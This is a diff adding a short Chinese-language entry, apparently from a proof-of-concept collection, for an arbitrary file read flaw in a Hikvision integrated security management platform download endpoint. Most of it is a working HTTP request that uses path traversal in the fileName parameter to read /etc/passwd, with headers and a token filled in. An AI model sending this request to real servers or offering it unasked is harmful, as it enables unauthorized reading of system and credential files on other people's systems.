@@ -1,0 +1,10 @@
+# HIKVISION综合安防管理平台download文件读取漏洞
+# 海康威视是以视频为核心的智能物联网解决方案和大数据服务提供商。
+# 综合安防管理平台/orgManage/v1/orgs/download接口存在任意文件读取漏洞，通过此漏洞攻击者可以读取服务器上敏感文件
+GET /center/api/task/..;/orgManage/v1/orgs/download?acid=80051729&fileName=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bid=hd_tag_m8mv260m HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv260m
+RM-PRO-Token: 25ffb872d5a06cfcafc9462c0b3f58b3
+RM-PRO-Time: 1742808520603
+User-Agent: curl/7.83.1
+
